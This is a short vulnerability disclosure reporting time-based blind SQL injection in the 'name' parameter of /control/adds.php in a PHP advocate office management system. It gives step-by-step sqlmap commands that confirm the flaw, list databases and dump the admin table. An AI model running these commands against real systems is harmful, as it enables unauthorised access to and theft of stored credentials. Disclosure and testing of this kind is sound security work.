## Link
[https://www.sourcecodester.com/php/17280/advocate-office-management-system-free-download.html](https://www.sourcecodester.com/php/17280/advocate-office-management-system-free-download.html)

Related Code file: /control/adds.php

Injection parameter: MULTIPART name

POST parameter 'MULTIPART name' is vulnerable to time-based Blind SQLi.

## Demonstration

`/control/adds.php`

![4](https://github.com/user-attachments/assets/77384960-511a-475e-9ea9-c39b0cdb3e1e)

We intercept the request using Burpsuite Proxy.

![5](https://github.com/user-attachments/assets/90ae95c9-4e5c-4c9c-9373-c0590bcc8bc7)

Save the request to `kortexlite_addclient.txt`.

parameter name is vulnerable to time-based blind sql injection

### Verify vulnerability

```
sqlmap -r kortexlite-addclient.txt --batch 
```

![30](https://github.com/user-attachments/assets/6ef125ae-e66a-45c7-b7e2-6d46245d5c28)

### Dump databases

```
sqlmap -r kortexlite-addclient.txt --batch --dbs
```

![31](https://github.com/user-attachments/assets/9014f7c1-ec35-4ce5-88d9-780282c1e731)

### Dump 

```
sqlmap -r kortexlite-addclient.txt --batch --dbs -D kortex_lite -T admin --dump
```

![32](https://github.com/user-attachments/assets/3a503ec1-c1e7-4a97-b77a-11e7a8617a35)
